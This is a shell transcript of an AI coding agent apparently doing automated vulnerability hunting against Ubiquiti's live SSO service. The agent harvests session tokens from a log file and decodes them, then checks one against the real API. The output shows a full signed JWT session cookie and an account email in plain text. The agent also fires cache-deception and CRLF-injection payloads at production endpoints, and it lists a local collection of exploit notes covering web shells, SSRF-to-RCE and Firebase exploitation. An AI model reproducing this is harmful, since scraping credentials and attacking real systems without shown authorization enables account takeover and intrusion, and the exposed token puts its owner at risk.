+ified,isLocked:!1,reloadChallenge:!1,emailChangeable:!1,feedbackSubmittable:!1,ssoId:t?.uuid}),e.invalidateQueries({queryKey:[H.SSO_PROFILE]})},DQ=(e=ES)=>{let t=iw(),{closeVisibleModal:n}=Bw(),r=xQ();return{logout:bQ({bridge:void 0,mutationFn:e.logout,onSuccess:(e,{url:i})=>{t(),n();let{redirect:a,innerRedirect:o}=TQ(i);r({redirect:a,innerRedirect:o})}}).mutate}},k9e=({onForgotPassword:e})=>{let{name:t,state:n,handleChange:r,handleBlur:i}=lQ(),a=n.meta.errors?.[0],o=!n.meta.isValid;return(0,I.jsxs)(Y,{column:!0,gap:4,children:[(0,I.jsx)(zH,{id:`password-required-modal`,value:n.value,onChange:r,onBlur:i,is
+{isInitialLoading:t}=aw(),n=kp(),r=xQ(),i=eg(),{upcomingMaintenance:a,uiIncidents:o}=g1(),[s,c]=(0,F.useState)(!1),l=n.getQueryData([H.SSO_AUTH_STATE])?.isAuthenticated;if((0,F.useEffect)(()=>{let e=new Image;e.src=Krt,e.onload=()=>c(!0)},[]),t)return null;if(l&&!ghe.has(i.pathname)){let{redirect:e,innerRedirect:t}=TQ(window.location.href);return r({redirect:e,innerRedirect:t}),null}return(0,I.jsxs)(Yrt,{publicPage:!0,children:[(o||a||!1)&&(0,I.jsx)(Y,{width:`100%`,justifyContent:`center`,padding:20,children:(0,I.jsx)(kst,{loginPage:!0,omitMarginBottom:!0})}),(0,I.jsx)(Nst,{$imageLoaded:s}),(0,I.jsx)(Mst,{
+ner=null,t.location.href=e,!0):!1},aNt=()=>navigator.userActivation?.isActive??!0,oNt=()=>iC()&&aNt()&&iNt(),sNt=6e5,d5=(e=ES)=>{let t=kp(),n=uC(),r=xQ();e4();let i=bQ({bridge:e=>e.is_verified?Mw(e):null,mutationFn:e.login,onMutate:()=>{t.setQueryData([H.SSO_LOGIN_STATE],{isLoading:!0,redirect:null,innerRedirect:null})},onSettled:async(e,i)=>{let{redirect:a,innerRedirect:o}=TQ(window.location.href);t.setQueryData([H.SSO_LOGIN_STATE],t=>({...t,error:i?.status===499?void 0:i?.response?.data,isLoading:!1,unverifiedEmail:e?.is_verified?void 0:e?.email,authenticators:i?.response?.data?.authenticators,defaultMFA
+?.response?.data?.otp_prefix,redirect:a,innerRedirect:o,defaultEmailMfa:O9e(i)}));let s=E9e([`unifi.ui.com`,`unifi.df.ui.com`,`unifi.stg.ui.com`,`unifi.dev.ui.com`],a)||e?.is_verified;if(!i&&s){if(EQ(t,e),await $2(e,t)){n(`/login/create-passkey`,{state:{allowPasskeyPrompt:!0}});return}r({redirect:a,innerRedirect:o})}else return t.setQueryData([H.SSO_AUTH_STATE],e=>({...e,emailChangeable:i?.status===499&&!!i.response?.data.user.email_changeable,feedbackSubmittable:i?.status===499&&!!i.response?.data.user.feedback_submittable,isLocked:i?.status===423,reloadChallenge:i?.status===423&&!e.isLocked,loginData:i?.
+[0m
+[0m$ [0mcd /tmp/acct27
+echo "=== hash.slice ==="
+grep -oE '.{250}hash\.slice.{250}' app.js | head -4
+echo; echo "=== location.href= sinks ==="
+grep -oE '.{250}location\.href=.{250}' app.js | head -8
+echo; echo "=== location.replace/assign with non-literal ==="
+grep -oE '.{120}location\.(replace|assign)\([^)]{0,120}\).{60}' app.js | head -12
+=== hash.slice ===
+
+=== location.href= sinks ===
+e.compareDocumentPosition(t)&16):!1:!1}function Yr(e){e=e!=null&&e.ownerDocument!=null&&e.ownerDocument.defaultView!=null?e.ownerDocument.defaultView:window;for(var t=Gr(e.document);t instanceof e.HTMLIFrameElement;){try{var n=typeof t.contentWindow.location.href==`string`}catch{n=!1}if(n)e=t.contentWindow;else break;t=Gr(e.document)}return t}function Xr(e){var t=e&&e.nodeName&&e.nodeName.toLowerCase();return t&&(t===`input`&&(e.type===`text`||e.type===`search`||e.type===`tel`||e.type===`url`||e.type===`passw
+et e=Ote(t.digest);if(e){let i=og.get(t);if(i)throw i;let a=Nh(e.location,n),o=a.absoluteURL||a.to;if(Lh(e.location,o,Fh(r),`allow-explicit`),Ste(o))throw Error(`Invalid redirect location`);if(Mh&&!og.get(t)){if(a.isExternal||e.reloadDocument)window.location.href=o;else{let n=Promise.resolve().then(()=>window.__reactRouterDataRouter.navigate(a.to,{replace:e.replace}));throw og.set(t,n),n}}return F.createElement(`meta`,{httpEquiv:`refresh`,content:`0;url=${o}`})}}return e}function Rte({routeContext:e,match:t,c
+alues:a}))};return window.addEventListener(`message`,r),()=>{window.removeEventListener(`message`,r)}},[d,t,e,u,n]),(0,F.useEffect)(()=>()=>l(),[l]),{openConsentPopup:(0,F.useCallback)(e=>{if(r.current&&!r.current.closed){r.current.focus(),r.current.location.href=e;return}let n=fpt(),a=window.open(e,`msp-idp-consent`,ppt(n));if(!a)t({messageId:`PROFILE_ORGANIZATION_IDP_POPUP_BLOCKED`});else{try{a.moveTo(n.left,n.top),a.resizeTo(h3,g3)}catch{}a.focus(),r.current=a,o(!0),c(`idle`),l(),i.current=window.setInterv
+if(!i)throw Error(`No Stripe publishable key for region "${e}"`);let a=await(await Fvt(i))?.confirmCardPayment(n,{payment_method:typeof r==`string`?r:r.id,return_url:t},{handleActions:!1});a?.paymentIntent?.next_action?.redirect_to_url?.url&&(window.location.href=a.paymentIntent.next_action.redirect_to_url.url)},Vvt=(e,t)=>e.filter(e=>e.region===t),Hvt=(e,t={})=>{let{preferredCardId:n,fallbackRegion:r}=t;return e.find(e=>e.id===n)??(r?e.find(e=>e.region===r):void 0)??e[0]},Uvt=(e,t)=>e!==void 0&&e.region!==t,
+ANCEL`})})})]})]})})},Iwt=(e=k2)=>{let t=kp(),{successToast:n,errorToast:r}=c2();return{createTWCardAsync:bQ({bridge:e=>e.data.tw?.payment_url?null:Pw(vw.PAYMENT_METHOD),mutationFn:t=>e.createTaiwan(t),onSuccess:({data:e})=>{e.tw?.payment_url?window.location.href=e.tw.payment_url:tvt(n)},onSettled:(e,n)=>{t.invalidateQueries({queryKey:[H.BILLING_CUSTOMER]}),n||t.invalidateQueries({queryKey:[H.BILLING_CARDS]})},onError:e=>{let t=w6(e);r({message:t})}}).mutateAsync}},z6=(0,F.forwardRef)(({id:e,labelId:t,error:n
+_SOMETHING_WENT_WRONG`},nNt=e=>eNt(e)?`LOGIN_MFA_PASSKEY_FAILED_DESCRIPTION_EXPIRED`:`LOGIN_MFA_PASSKEY_FAILED_DESCRIPTION`,rNt=`addPasskey`,iNt=()=>{let e=OC(`security`,void 0,{[ZS]:!1,[rNt]:!0}),t=window.open(``,`_blank`);return t?(t.opener=null,t.location.href=e,!0):!1},aNt=()=>navigator.userActivation?.isActive??!0,oNt=()=>iC()&&aNt()&&iNt(),sNt=6e5,d5=(e=ES)=>{let t=kp(),n=uC(),r=xQ();e4();let i=bQ({bridge:e=>e.is_verified?Mw(e):null,mutationFn:e.login,onMutate:()=>{t.setQueryData([H.SSO_LOGIN_STATE],{is
+atus`),idpId:g7(`idpId`),message:g7(`message`)};if(window.opener&&!window.opener.closed){try{window.opener.postMessage(e,window.location.origin)}catch{}window.close()}else window.location.replace(`/#profile`)},[]),null),uIt=e=>setTimeout(()=>{window.location.href=e},2e3),dIt=()=>{let[e,t]=(0,F.useState)(null),{subscriptionId:n,url:r,region:i}=Rvt();return(0,F.useEffect)(()=>{n&&i&&r||e||t(`ERROR_SOMETHING_WENT_WRONG`)},[e,i,n,r]),(0,F.useEffect)(()=>{(async()=>{try{if(!n||!i||!r)return;let e=(await zvt(n,i))[
+.useMemo)(()=>t?null:n?.setup_uri?(0,I.jsx)(bLt,{uri:n.setup_uri}):null,[n?.setup_uri,t]),o=()=>{n?.id&&i(n?.id),r(),e()};(0,F.useEffect)(()=>{n?.isSuccess&&e()},[n?.isSuccess,e]);let s=(0,F.useMemo)(()=>{if(t&&n?.setup_uri)return{onPress:()=>window.location.href=n.setup_uri,labelId:`MFA_APP_SETUP`}},[n?.setup_uri,t]);return(0,I.jsxs)(fZ,{column:!0,padding:`10px 12px`,gap:8,marginTop:8,children:[(0,I.jsxs)(Y,{gap:8,children:[a,(0,I.jsxs)(Y,{column:!0,gap:2,children:[(0,I.jsx)(K,{variant:`heading-medium`,child
+
+=== location.replace/assign with non-literal ===
+reateHref(r.mask||r);try{o.pushState(d,``,f)}catch(e){if(e instanceof DOMException&&e.name===`DataCloneError`)throw e;i.location.assign(f)}a&&c&&c({action:s,location:h.location,delta:1})}function p(
+n null}},cC=e=>typeof e==`string`?e:`${e.pathname??``}${e.search??``}${e.hash??``}`,lC=(e,t,n,r)=>{t===`_self`?r?window.location.replace(e):window.location.assign(e):window.open(e,t,n)},uC=()=>{let e
+(n=>{let r=t.getQueryData([H.SSO_LOGIN_STATE]),i=n?.redirect??r?.redirect,a=n?.innerRedirect??r?.innerRedirect;i?window.location.replace(i):e(a||`/`,{replace:!0})},[t,e])},SQ=function(e){return e.ACT
+=()=>{let e=jS(window.location.href,`subscription_id`),t=jS(window.location.href,`return_url`);return t&&!NS(t)?(window.location.replace(window.location.origin),{subscriptionId:void 0,url:void 0,region:void 0}):{subscrip
+ompleteError:s}=BPt(),c=(0,F.useRef)(!1),l=(0,F.useCallback)(async()=>{try{let{next:e}=await o({code:t,state:n});window.location.replace(e)}catch{}},[t,n,o]);(0,F.useEffect)(()=>{c.current||(c.curren
+ts&&!i.enforce_idp){d(`LOGIN_ERROR_CREDENTIALS_NO_USER`);return}let{idp:o,enforcedIdpRedirectUrl:s}=gFt(i);if(s){window.location.assign(s);return}let u={};if(i.login_methods.includes(H5.PASSKEY)){le
+.state.values.user}):(0,I.jsx)(f1,{errorMessage:h}),(0,I.jsx)(aFt,{form:p}),_&&(0,I.jsx)(nFt,{idp:_,onPress:()=>{window.location.assign(_.loginUrl)}})]}),(0,I.jsx)(QPt,{form:p,navigate:()=>i(`/register`),tri
+!0,c(t);try{let n=await i({user:t,return_to:window.location.href}),{idp:a,enforcedIdpRedirectUrl:o}=gFt(n);if(o){window.location.assign(o);return}let s={success:!1,hasPasskey:!1};n.login_methods.inc
+pener&&!window.opener.closed){try{window.opener.postMessage(e,window.location.origin)}catch{}window.close()}else window.location.replace(`/#profile`)},[]),null),uIt=e=>setTimeout(()=>{window.location.href=e},2
+.email,u=c.toLowerCase(),d=!!u&&(l?.toLowerCase()===u||a?.username.toLowerCase()===u),f=(0,F.useCallback)(()=>{s?window.location.replace(s):t(`/`,{replace:!0})},[s,t]),p=(0,F.useCallback)(()=>{let e=
+ntview`)?OC(`payments`,{action:`add`},{[Jme]:!0}):OC(`payments`);return(0,I.jsx)(kQ,{to:t,replace:!0})},eHt=()=>(window.location.replace(qVt.base),null),tHt=({children:e})=>{let{language:t,messages:n}=(0,F.
+[0m
+[0m$ [0mcd /tmp/acct27
+echo "=== uIt callers ==="; grep -oE '.{200}uIt\(.{200}' app.js | head -6
+echo; echo "=== gFt (enforcedIdpRedirectUrl) ==="; grep -oE '.{80}gFt=.{400}' app.js | head -3
+echo; echo "=== OC url builder ==="; grep -oE '.{40}OC=\(.{300}' app.js | head -3
+echo; echo "=== NS validator ==="; grep -oE '.{20}NS=\(.{300}' app.js | head -3
+echo; echo "=== IS validator ==="; grep -oE '.{20}IS=\(.{300}' app.js | head -3
+=== uIt callers ===
+e){return ka(e,{level:`error`,extra:{context:`Failed to complete 3DS validation`,region:i,subscriptionId:n}}),t(`ERROR_SOMETHING_WENT_WRONG`)}})()},[i,n,r]),(0,F.useEffect)(()=>{let t;return r&&e&&(t=uIt(r)),()=>t&&clearTimeout(t)},[e,r]),(0,I.jsx)(fIt,{children:e?(0,I.jsxs)(I.Fragment,{children:[(0,I.jsx)(TF,{variant:`flat`,size:72}),(0,I.jsx)(K,{color:`text-1`,variant:`heading-large`,children:(0,I.j
+
+=== gFt (enforcedIdpRedirectUrl) ===
+e:o}),a&&(0,I.jsx)(t7,{onVerify:t=>n({captcha:t,site_key:mFt,username:e})})]})},gFt=({enforce_idp:e,login_methods:t,login_url:n,idp_name:r})=>{let i=t.includes(H5.PASSWORD)||t.includes(H5.PASSKEY),a=t.includes(H5.IDP)&&n&&r?{name:r,loginUrl:n}:void 0;return{idp:a,enforcedIdpRedirectUrl:e&&a&&!i?a.loginUrl:void 0}},_Ft=e=>e?.includes(k4.INVALID_CREDENTIAL)?`LOGIN_ERROR_CREDENTIALS`:e?.includes(k4.SUPPRESSED_EMAIL)?`LOGIN_ERROR_SUPPRESSED_EMAIL`:e?.includes(k4.ACCOUNT_LOCKED)?`LOGI
+
+=== OC url builder ===
+${t.id}`:t?.action?`${e}:${t.action}`:e,OC=(e,t,n)=>{let r=Bhe(e,t),i=new URLSearchParams;return i.set(EC,r),n&&(zhe(i,n),i.set(EC,r)),`${TC(e)}?${jC(i)}`},kC=e=>{let t={};return(e.get(EC)??``).split(`,`).map(e=>e.trim()).filter(Boolean).forEach(e=>{let n=e.indexOf(`:`),r=n===-1?e:e.slice(0,n);if(!CC(r))return;let i=n===-1?``:e.slice(n+1),a=i
+
+=== NS validator ===
+
+=== IS validator ===
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+ls -R vulnebleti | head -80
+echo "=== cache notes ==="; for f in vulnebleti/cache/*; do echo "--- $f"; head -40 "$f"; done 2>/dev/null | head -100
+vulnebleti:
+ATO
+BAC
+File_upload
+Forget_password_endpoint
+Fuzz
+Idor
+LFI
+Secret_keys
+Sqli
+Ssrf
+cache
+cspt
+http_request_smuggling
+op-to-xss
+os-command-injection
+
+vulnebleti/ATO:
+ATO_Encoding_Exploit_Strategies.md
+Encoding-ato.md
+ato_bug_hunting_tips.md
+forget_password_bug_hunting_notes.md
+oauth_misconfiguration_bug_hunting_notes.md
+
+vulnebleti/BAC:
+Application-Level-DoS.txt
+Management_Website_BAC_Checklist.md
+all-actions.md
+api-hacking.txt
+idor_bypass_techniques.md
+usefull-notes.md
+
+vulnebleti/File_upload:
+Exploit.md
+Web-Shell-Payloads.md
+
+vulnebleti/Forget_password_endpoint:
+Exploit.md
+
+vulnebleti/Fuzz:
+Encoding-Based
+Unicode_a.txt
+control-character-techniques.md
+delimiters.txt
+extensions.txt
+fuzzing_commands.md
+idor.txt
+open-redirect-bypass.md
+unicode_alphabet.md
+
+vulnebleti/Fuzz/Encoding-Based:
+encoding-based-a-z.md
+t
+
+vulnebleti/Idor:
+Idor.md
+idor_bypass_techniques.md
+
+vulnebleti/LFI:
+ect-passwd-waf-bypass.md
+
+vulnebleti/Secret_keys:
+Firebase-tool
+Firebase_Exploitation_Commands.md
+Test.md
+
+vulnebleti/Secret_keys/Firebase-tool:
+README.md
+Test.txt
+firebase_exploit.sh
+
+vulnebleti/Sqli:
+Test.txt
+sql_payloads.md
+
+vulnebleti/Ssrf:
+Ssrf_to_rce.md
+Top 1000 Ports.md
+combined_ssrf_lfi_payloads.txt
+os-command-injection.md
+=== cache notes ===
+--- vulnebleti/cache/Advanced_Cache_Deception_Methodology.md
+# Advanced Cache Deception Methodology
+
+## 1. Exploiting Static Directories & Files with Delimiters
+
+### Overview
+This technique targets scenarios where the **CDN normalizes the path** but the **backend server uses delimiters** and does **not normalize**. 
+
+### Step-by-Step:
+
+1. **Identify CDN**:
+   - Target CDNs that **normalize paths**:
+     - Amazon CloudFront
+     - Microsoft Azure
+     - Imperva CDN
+
+2. **Identify Backend Server**:
+   - Look for backend servers that support **delimiters** and do **not normalize** the path:
+     - Apache
+     - Gunicorn
+     - Puma
+
+3. **Craft the Payload**:
+   ```http
+   GET /<Dynamic_Resource><Delimiter><Encoded_Dot_Segment><Static_Directory>
+   ```
+   - Example: 
+     ```http
+     GET /login??..;/static/logo.png HTTP/1.1
+     ```
+
+---
+
+## 2. Exploiting Static Directories & Files with Normalization
+
+### Overview
+This technique applies when the **CDN does NOT normalize** the path, but the **backend server does**.
+
+### Step-by-Step:
+
+1. **Identify CDN**:
+--- vulnebleti/cache/cache-vulnerabilities-guide.md
+
+# Cache Normalization and Deception/Poisoning Vulnerability Guide
+
+This document provides technical notes on identifying and exploiting cache-related vulnerabilities based on the behavior of CDN vs Backend path normalization and encoding handling.
+
+---
+
+## 📌 Key Concepts
+
+- **CD (Cache Deception):** Delivering sensitive or private content as cacheable by tricking the CDN.
+- **CP (Cache Poisoning):** Injecting untrusted content into a shared cache, affecting what future users see.
+
+---
+
+## 🔍 Detection: CDN and Backend Normalization Behavior
+
+### Case 1: Backend Normalizes but CDN Does Not (Ideal for Cache Deception)
+
+#### How to Test
+1. Send:
+   ```
+   GET https://example.com/x/../favicon.ico
+   ```
+   If response is **200 + cache miss**, proceed.
+2. Send:
+   ```
+   GET https://example.com/favicon.ico
+   ```
+   If response is also **200 + cache miss**, then:
+   - ✅ Backend **normalizes**
+   - ❌ CDN **does not normalize**
+
+#### Exploitation Payloads (CD)
+- Basic:
+  ```
+  /static/..%5CmyAccount
+  ```
+
+- If backend uses delimiter-based routing:
+  ```
+--- vulnebleti/cache/cache_deception_methodology.md
+
+# Advanced Cache Deception Methodology
+
+## 1. Exploiting Static Directories Files with Delimiters
+
+This method works when the CDN **normalizes the path**, but the backend server does **not normalize** and treats delimiters as separate endpoints.
+
+### Identify CDN
+- **Amazon CloudFront**
+- **Microsoft Azure CDN**
+- **Imperva CDN**
+
+These typically normalize the path.
+
+### Identify Backend Server
+- **Apache**, **Gunicorn**, **Puma**, etc.
+[0m
+Let me test an untried high-impact class: **cache deception** on the authenticated SSO API. First I need a valid test session.
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+echo "=== recent UBIC_AUTH tokens (last occurrences) ==="
+grep -oE 'UBIC_AUTH=[A-Za-z0-9._%-]+' result/logs/opencode.log | tail -5 | sed -E 's/(UBIC_AUTH=.{25}).*/\1.../' 
+echo "=== count ==="; grep -c 'UBIC_AUTH=' result/logs/opencode.log
+echo "=== decode last few JWT payloads ==="
+for tok in $(grep -oE 'UBIC_AUTH=[A-Za-z0-9._%-]+' result/logs/opencode.log | tail -8 | sed 's/UBIC_AUTH=//'); do
+  p=$(echo "$tok" | cut -d. -f2); pad=$(( (4 - ${#p} % 4) % 4 )); p="$p$(printf '=%.0s' $(seq 1 $pad))";
+  echo "$tok" | cut -d. -f1-2 | head -c 20; echo " ... payload: $(echo "$p" | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 200)"; echo
+done 2>/dev/null | tail -20
+=== recent UBIC_AUTH tokens (last occurrences) ===
+grep: result/logs/opencode.log: binary file matches
+=== count ===
+511
+=== decode last few JWT payloads ===
+[0m
+[0m$ [0mcd /home/runner/work/aaii-aautomattionn-for-doomainn/aaii-aautomattionn-for-doomainn
+grep -aoE 'UBIC_AUTH=[A-Za-z0-9._%-]+' result/logs/opencode.log | tail -12 > /tmp/toks.txt
+wc -l /tmp/toks.txt
+while IFS= read -r line; do
+  tok=${line#UBIC_AUTH=}
+  p=$(printf '%s' "$tok" | cut -d. -f2)
+  pad=$(( (4 - ${#p} % 4) % 4 )); [ $pad -ne 0 ] && p="$p$(printf '=%.0s' $(seq 1 $pad))"
+  dec=$(printf '%s' "$p" | tr '_-' '/+' | base64 -d 2>/dev/null | head -c 220)
+  echo "TOK ${tok:0:18}... => $dec"
+done < /tmp/toks.txt
+12 /tmp/toks.txt
+TOK eyJhbGciOiJSUzI1..... => 
+TOK eyJhbGciOiJSUzI1..... => 
+TOK eyJhbGciOiJSUzI1..... => 
+TOK eyJhbGciOiJSUzI1..... => 
+TOK eyJ... => 
+TOK eyJ...... => 
+TOK eyJ... => 
+TOK fake... => }�
+TOK fake... => }�
+TOK fake... => }�
+TOK eyJhbGciOiJSUzI1Ni... => {"UUID":"d8946fad-2b8e-4cf0-82c5-5d955b57b829","expiry":1798069631,"is_verified":true,"session":"dba4d016-2f39-48d8-8073-a765dba6475e","ttl_seconds":2592000,"sub":"d8946fad-2b8e-4cf0-82c5-5d955b57b829","iss":"https://sso
+TOK .... =>
+[0m
+[0m$ [0mcd /tmp
+# take the last full JWT token (not 'fake')
+awk -F= 'length($2)>100 {print $2}' /tmp/toks.txt | tail -3 > /tmp/cand_tokens.txt
+wc -l /tmp/cand_tokens.txt
+i=0
+while IFS= read -r tok; do i=$((i+1)); echo "--- token $i (${#tok} chars)"; 
+  code=$(curl -s -o /tmp/us.json -w "%{http_code}" -A "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15" -H "Cookie: UBIC_AUTH=$tok" "https://sso.ui.com/api/sso/v1/user/self");
+  echo "HTTP $code"; head -c 300 /tmp/us.json; echo; 
+  if [ "$code" = "200" ]; then echo "$tok" > /tmp/A_token.txt; echo "SAVED token $i as A"; fi
+done < /tmp/cand_tokens.txt
+1 /tmp/cand_tokens.txt
+--- token 1 (1141 chars)
+HTTP 200
+{"username":"testttt12","email":"tan.tiger5564@maildrop.cc","curr_terms_rev":"REV2013-01-18","curr_privacy_rev":"REV2013-01-18","curr_terms_aircrm_rev":"REV2015-05-19","session_ttl_seconds":null,"is_verified":true,"twofa_enabled":true,"last_login":"2026-11-23T07:32:51.588519Z","first_name":"OpenCode
+SAVED token 1 as A
+[0m
+[0m$ [0mcd /tmp
+TOK=$(cat /tmp/A_token.txt)
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+echo "=== baseline /user/self (auth) headers ==="
+curl -s -D - -o /dev/null -A "$UA" -H "Cookie: UBIC_AUTH=$TOK" "https://sso.ui.com/api/sso/v1/user/self" | grep -iE '^(HTTP|cache-control|age|x-cache|vary|via|content-type|content-encoding|etag|last-modified|set-cookie|expires|pragma)' 
+echo "=== baseline unauth ==="
+curl -s -D - -o /dev/null -A "$UA" "https://sso.ui.com/api/sso/v1/user/self" | grep -iE '^(HTTP|cache-control|age|x-cache|vary|via|content-type)'
+=== baseline /user/self (auth) headers ===
+HTTP/2 200 
+content-type: application/json
+set-cookie: UBIC_AUTH=eyJhbGciOiJSUzI1NiIsImtpZCI6Ik1lU1hTck1EeDhXb3dqSDZWVjNDWGJoa2JmTktSNmMxbThfVVNfZEFKX0kiLCJ0eXAiOiJKV1QifQ.eyJVVUlEIjoiZDg5NDZmYWQtMmI4ZS00Y2YwLTgyYzUtNWQ5NTViNTdiODI5IiwiZXhwaXJ5IjoxNzk4MTA1MzA4LCJpc192ZXJpZmllZCI6dHJ1ZSwic2Vzc2lvbiI6ImRiYTRkMDE2LTJmMzktNDhkOC04MDczLWE3NjVkYmE2NDc1ZSIsInR0bF9zZWNvbmRzIjoyNTkyMDAwLCJzdWIiOiJkODk0NmZhZC0yYjhlLTRjZjAtODJjNS01ZDk1NWI1N2I4MjkiLCJpc3MiOiJodHRwczovL3Nzby51aS5jb20iLCJleHAiOjE3OTgxMDUzMDgsIkwyIjoxNzk1NDc5NDMxfQ.OxxhO42hYGhhdvK_9Bve9JmTYisqOo0ONIF28eEe7VUiGYQk_pEQu7vndXEtX3Kp-IHLpDy7AIqRb9Kvr6l5FoWrc_meGV3ZxpK6jSRRgaGMUOokMZcxG3Y_eGdEszGd6-W_ClF65FsmUMlw7nfl25rgIJ9QTyCsSts10IlFtjWQC52SCNBs4tv2cEFciI3QkKjvRVNTJVCaIk7oPTNf2IvXR-gaGM1uKkxpZQG7xEHoEiPMfpx-jQvBUeH4UrGdCY8KG8a5yz-9r_k9e6BNs0GwjT4yU-wgbNU57M5uC_utnotgTfl5A7fachihyIX0VYAEEt8UdyUaa8QY5IfPB15lGSLqlHRm5u3VBAnb06okuAAoyMXyk7sr0DSUlfMcW9knf2a305iX3PZv-iIBqh5LDr0AzBPsRGf5yESXCfuR8eJOyEJWCfnUgQ4v7ykwoGt4KzerwqAHM-ExmrXPwoggCwUps5Rr24RdqgaTBpOA3G68rFl_m5FrX9YN4DrEVzc2fdSSifGVIEcPvOiGyOoRI4Dd9TuuBvZdK-2kvlHHDZyYTlU2tekQIPMEkCCSH8CWfA5G-gSMYZOW3CkPgwFNQhwnm1l_XsouNf5FK8sVT03BR4IU1iQU4grrxhpimTR2KTEk5GeO39B5BrV1EN0m2hUJ79LyW6hZHSbOSJs; Domain=.ui.com; expires=Thu, 24 Dec 2026 09:41:48 GMT; HttpOnly; Max-Age=2592000; Path=/; SameSite=lax; Secure; Version=1
+pragma: no-cache
+expires: 0
+cache-control: private, max-age=0, no-cache
+vary: origin
+x-cache: Miss from cloudfront
+via: 1.1 61a23c3c43c5b215b887e53cb3ad3d06.cloudfront.net (CloudFront)
+vary: Origin
+=== baseline unauth ===
+HTTP/2 401 
+content-type: text/html; charset=utf-8
+cache-control: private, max-age=0, no-cache
+vary: origin, Cookie
+x-cache: Error from cloudfront
+via: 1.1 c052ab3d53e609c028afd991433bfed2.cloudfront.net (CloudFront)
+vary: Origin
+[0m
+[0m$ [0mcd /tmp
+TOK=$(cat /tmp/A_token.txt); UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+R=$(head -c8 /dev/urandom | od -An -tx1 | tr -d ' \n')
+for path in "/api/sso/v1/user/self.css" "/api/sso/v1/user/self/x$R.css" "/api/sso/v1/user/self;.css" "/api/sso/v1/user/self/..%2f..%2fuser%2fself.css" "/api/sso/v1/user/self%00.css" "/api/sso/v1/user/self.json"; do
+  echo "===== $path"
+  echo -n "auth: "; curl -s -D /tmp/h1 -o /tmp/b1 -w "%{http_code} ct=%{content_type} size=%{size_download}" -A "$UA" -H "Cookie: UBIC_AUTH=$TOK" "https://sso.ui.com$path"; echo; grep -iE '^(cache-control|x-cache|vary|age):' /tmp/h1 | tr '\n' ' '; echo
+  echo -n "unauth: "; curl -s -D /tmp/h2 -o /tmp/b2 -w "%{http_code} ct=%{content_type} size=%{size_download}" -A "$UA" "https://sso.ui.com$path"; echo; grep -iE '^(cache-control|x-cache|vary|age):' /tmp/h2 | tr '\n' ' '; echo
+  echo -n "bodies: auth="; head -c 60 /tmp/b1 | tr -d '\n'; echo " | unauth="; head -c 60 /tmp/b2 | tr -d '\n'; echo
+done
+===== /api/sso/v1/user/self.css
+auth: 404 ct=text/html; charset=utf-8 size=179
+cache-control: private, max-age=0, no-cache vary: origin x-cache: Error from cloudfront vary: Origin 
+unauth: 404 ct=text/html; charset=utf-8 size=179
+cache-control: private, max-age=0, no-cache vary: origin, Cookie x-cache: Error from cloudfront vary: Origin 
+bodies: auth=<!doctype html><html lang="en"><head>  <title>Not Found< | unauth=
+<!doctype html><html lang="en"><head>  <title>Not Found<
+===== /api/sso/v1/user/self/xfa9da4c9b90fdf66.css
+auth: 404 ct=text/html; charset=utf-8 size=179
+cache-control: private, max-age=0, no-cache vary: origin x-cache: Error from cloudfront vary: Origin 
+unauth: 404 ct=text/html; charset=utf-8 size=179
+cache-control: private, max-age=0, no-cache vary: origin, Cookie x-cache: Error from cloudfront vary: Origin 
+bodies: auth=<!doctype html><html lang="en"><head>  <title>Not Found< | unauth=
+<!doctype html><html lang="en"><head>  <title>Not Found<
+===== /api/sso/v1/user/self;.css
+auth: 404 ct=text/html; charset=utf-8 size=179
+cache-control: private, max-age=0, no-cache vary: origin x-cache: Error from cloudfront vary: Origin 
+unauth: 404 ct=text/html; charset=utf-8 size=179
+cache-control: private, max-age=0, no-cache vary: origin, Cookie x-cache: Error from cloudfront vary: Origin 
+bodies: auth=<!doctype html><html lang="en"><head>  <title>Not Found< | unauth=
+<!doctype html><html lang="en"><head>  <title>Not Found<
+===== /api/sso/v1/user/self/..%2f..%2fuser%2fself.css
+auth: 404 ct=text/html; charset=utf-8 size=179
+cache-control: private, max-age=0, no-cache vary: origin x-cache: Error from cloudfront vary: Origin 
+unauth: 404 ct=text/html; charset=utf-8 size=179
+cache-control: private, max-age=0, no-cache vary: origin, Cookie x-cache: Error from cloudfront vary: Origin 
+bodies: auth=<!doctype html><html lang="en"><head>  <title>Not Found< | unauth=
+<!doctype html><html lang="en"><head>  <title>Not Found<
+===== /api/sso/v1/user/self%00.css
+auth: 400 ct=text/html size=915
+x-cache: Error from cloudfront 
+unauth: 400 ct=text/html size=915
+x-cache: Error from cloudfront 
+bodies: auth=<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//E | unauth=
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//E
+===== /api/sso/v1/user/self.json
+auth: 404 ct=text/html; charset=utf-8 size=179
+cache-control: private, max-age=0, no-cache vary: origin x-cache: Error from cloudfront vary: Origin 
+unauth: 404 ct=text/html; charset=utf-8 size=179
+cache-control: private, max-age=0, no-cache vary: origin, Cookie x-cache: Error from cloudfront vary: Origin 
+bodies: auth=<!doctype html><html lang="en"><head>  <title>Not Found< | unauth=
+<!doctype html><html lang="en"><head>  <title>Not Found<
+[0m
+Cache deception is negative (404, private/no-cache). Let me review the endpoint inventory for untested gaps.
+[0m→ [0mRead result/inventory/endpoints.md
+Let me test header injection on SSO redirect params and open-redirect on the fresh www build.
+[0m
+[0m$ [0mcd /tmp
+TOK=$(cat /tmp/A_token.txt); UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+echo "=== CRLF / Location injection on sso redirect params ==="
+for url in \
+ "https://sso.ui.com/api/sso/v1/jwt/token?redirect=https%3A%2F%2Fwww.ui.com%250d%250aX-Inj%3A%201" \
+ "https://sso.ui.com/api/sso/v1/jwt/token?redirect=https%3A%2F%2Fwww.ui.com%0d%0aX-Inj%3A1" \
+ "https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https%3A%2F%2Fwww.ui.com%0d%0aX-Inj%3A1" \
